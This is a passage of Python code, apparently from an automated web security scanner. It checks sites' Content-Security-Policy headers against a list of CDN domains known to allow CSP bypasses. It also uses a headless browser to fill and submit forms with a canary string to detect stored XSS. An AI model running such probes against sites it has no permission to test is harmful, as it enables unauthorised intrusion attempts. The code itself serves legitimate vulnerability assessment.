    "www.facebook.com",
    "staticxx.facebook.com",
}


def _csp_directives(csp: str) -> Dict[str, str]:
    directives: Dict[str, str] = {}
    for directive in csp.lower().split(";"):
        directive = directive.strip()
        if not directive:
            continue
        dname, sep, dval = directive.partition(" ")
        directives[dname] = dval.strip() if sep else ""
    return directives


def _csp_source_list(directives: Dict[str, str], name: str) -> List[str]:
    val = directives.get(name) or directives.get("default-src", "")
    return [s for s in val.split() if s] if val else []


async def phase_73_CSPBYPASS(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"73-CSPBYPASS"}:
        return {}
    _out = outdir / "csp_analysis.txt"
    if _out.exists() and not force:
        return {"73-CSPBYPASS": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 73-CSPBYPASS: CSP header analysis + bypass detection")
    findings: List[str] = []
    _csp_urlopen = _get_urlopener()
    _csp_headers = _extra_headers_dict()
    targets_file = outdir / "host_targets.txt"
    if not targets_file.exists() or not read_lines(targets_file):
        log("WARNING", "73-CSPBYPASS: no targets; skipping")
        return {"73-CSPBYPASS": str(_out), "count": 0}
    csp_known_bypass_domains = {
        "cdnjs.cloudflare.com",
        "ajax.googleapis.com",
        "cdn.jsdelivr.net",
        "cdn.socket.io",
        "code.jquery.com",
        "maxcdn.bootstrapcdn.com",
        "cdn.rawgit.com",
        "cdn.jsdelivr.net",
        "unpkg.com",
        "www.google-analytics.com",
        "googletagmanager.com",
        "googleapis.com",
        "gstatic.com",
        "youtube.com",
        "platform.twitter.com",
        "www.youtube.com",
        "apis.google.com",
        "ajax.aspnetcdn.com",
        "ajax.microsoft.com",
    }
    _csp_sem = asyncio.Semaphore(10)
    checked_hosts: Set[str] = set()
    for host in read_lines(targets_file)[:20]:
        base = host if host.startswith("http") else f"https://{host}"
        hostname = base.split("/")[2].split(":")[0] if "://" in base else base
        if hostname in checked_hosts:
            continue
        checked_hosts.add(hostname)
        async with _csp_sem:
            await _throttle_rate()
            try:
                req = urllib.request.Request(
                    base, method="GET", headers={"User-Agent": "Mozilla/5.0", **_csp_headers}
                )
                status, headers, body_bytes = await _async_urlopen(_csp_urlopen, req, timeout=10)
                csp = None
                for hdr_name in ("content-security-policy", "content-security-policy-report-only"):
                    val = headers.get(hdr_name, "")
                    if val:
                        csp = {"header": hdr_name, "value": val}
                        break
                if not csp:
                    findings.append(f"[no-csp] {base} — no CSP header (clickjacking/XSS risk)")
                    continue
                findings.append(f"[csp] {base} → {csp['header']}: {csp['value'][:200]}")
                directives = _csp_directives(csp["value"])
                script_sources = _csp_source_list(directives, "script-src")
                style_sources = _csp_source_list(directives, "style-src")
                if script_sources:
                    if "unsafe-inline" in script_sources and not any(
                        s.startswith(("'nonce-", "'sha")) for s in script_sources
                    ):
                        findings.append(
                            "  [warn] script-src allows 'unsafe-inline' without nonce/hash — XSS protection degraded"
                        )
                    if "unsafe-eval" in script_sources:
                        findings.append(
                            "  [warn] script-src allows 'unsafe-eval' — eval() XSS possible"
                        )
                    if any(s.startswith("http://") for s in script_sources):
                        findings.append(
                            "  [warn] script-src allows http:// — MITM possible over HTTP"
                        )
                    if "*" in script_sources or any(s.startswith("*.") for s in script_sources):
                        findings.append(
                            "  [warn] script-src wildcard source — XSS protection degraded"
                        )
                    for dom in csp_known_bypass_domains:
                        if any(dom in src for src in script_sources):
                            findings.append(
                                f"  [bypass] script-src whitelists {dom} — known JSONP/Angular bypass"
                            )
                if style_sources and "unsafe-inline" in style_sources:
                    findings.append(
                        "  [warn] style-src allows 'unsafe-inline' — CSS injection / UI redress risk"
                    )
                if "base-uri" not in directives:
                    findings.append(
                        "  [warn] no base-uri directive — DOM clobbering / injection possible"
                    )
                if "object-src" not in directives and "default-src" not in directives:
                    findings.append(
                        "  [warn] no object-src or default-src — Flash/plugin-based XSS"
                    )
                elif "object-src" in directives and "'none'" not in directives.get(
                    "object-src", ""
                ):
                    findings.append("  [warn] object-src not 'none' — plugin-based XSS possible")
                if "frame-ancestors" not in directives:
                    findings.append(
                        "  [warn] no frame-ancestors — clickjacking via <frame>/<iframe>"
                    )
            except asyncio.CancelledError:
                raise
            except Exception as e:
                findings.append(f"[error] {base} → {e}")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"73-CSPBYPASS: {len(findings)} CSP findings → {out}")
    return {"73-CSPBYPASS": str(_out), "count": len(findings)}


async def phase_80_STOREXSS(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"80-STOREXSS"}:
        return {}
    _out = outdir / "stored_xss.txt"
    if _out.exists() and not force:
        return {"80-STOREXSS": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 80-STOREXSS: stored XSS detection via browser re-navigation")
    findings: List[str] = []
    try:
        from playwright.async_api import async_playwright
    except ImportError:
        log("WARNING", "80-STOREXSS: playwright not installed; skipping (pip install playwright)")
        return {"80-STOREXSS": str(_out), "count": 0}
    urls_file = outdir / "urls_all.txt"
    if not urls_file.exists() or not read_lines(urls_file):
        log("WARNING", "80-STOREXSS: no URLs; skipping")
        return {"80-STOREXSS": str(_out), "count": 0}
    form_urls = [u for u in read_lines(urls_file) if "=" in u][:20]
    if not form_urls:
        log("WARNING", "80-STOREXSS: no param-bearing URLs; skipping")
        return {"80-STOREXSS": str(_out), "count": 0}
    async with async_playwright() as pw:
        browser = await pw.chromium.launch(
            headless=True, args=["--headless=new", "--no-sandbox", "--disable-gpu"]
        )
        try:
            for url in form_urls:
                await _throttle_rate()
                _CANARY = "rcxsstore" + base64.b64encode(os.urandom(6)).decode().rstrip("=")
                context = await browser.new_context(
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                )
                try:
                    page = await context.new_page()
                    await page.goto(url, timeout=20000, wait_until="domcontentloaded")
                    await page.evaluate(f"window.__rc_canary = '{_CANARY}'")
                    inputs = await page.query_selector_all("input, textarea")
                    for inp in inputs:
                        try:
                            await inp.type(_CANARY, delay=10)
                        except asyncio.CancelledError:
                            raise
                        except Exception:
                            continue
                    buttons = await page.query_selector_all(
                        "button[type=submit], input[type=submit]"
                    )
                    for btn in buttons:
                        try:
                            async with page.expect_navigation(timeout=10000) as nav:
                                await btn.click()
                            resp = await nav.value
                            if resp is not None:
                                try:
                                    nav_body = await resp.body()
                                except asyncio.CancelledError:
                                    raise
                                except Exception:
                                    nav_body = b""
                                if _CANARY.encode() in nav_body:
                                    findings.append(
                                        f"[stored-xss-candidate] {url} — canary in POST/POST-redirect response after submit"
                                    )
                                    break
                        except asyncio.CancelledError:
                            raise
                        except Exception:
                            continue
                    # Navigate to a few more pages to see if XSS triggers
                    for u2 in form_urls[:5]:
                        try:
                            await page.goto(u2, timeout=10000, wait_until="domcontentloaded")
                            has_canary = await page.evaluate(
                                f"document.body && document.body.innerHTML.includes('{_CANARY}')"
                            )
                            if has_canary:
                                findings.append(
                                    f"[stored-xss-candidate] {u2} — canary rendered from {url}"
                                )
                        except asyncio.CancelledError:
                            raise
                        except Exception:
                            continue
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
                finally:
                    await context.close()
        finally:
            await browser.close()
    if not findings:
        findings.append("[result] No stored XSS candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"80-STOREXSS: {len(findings)} stored XSS findings → {out}")
    return {"80-STOREXSS": str(_out), "count": len(findings)}
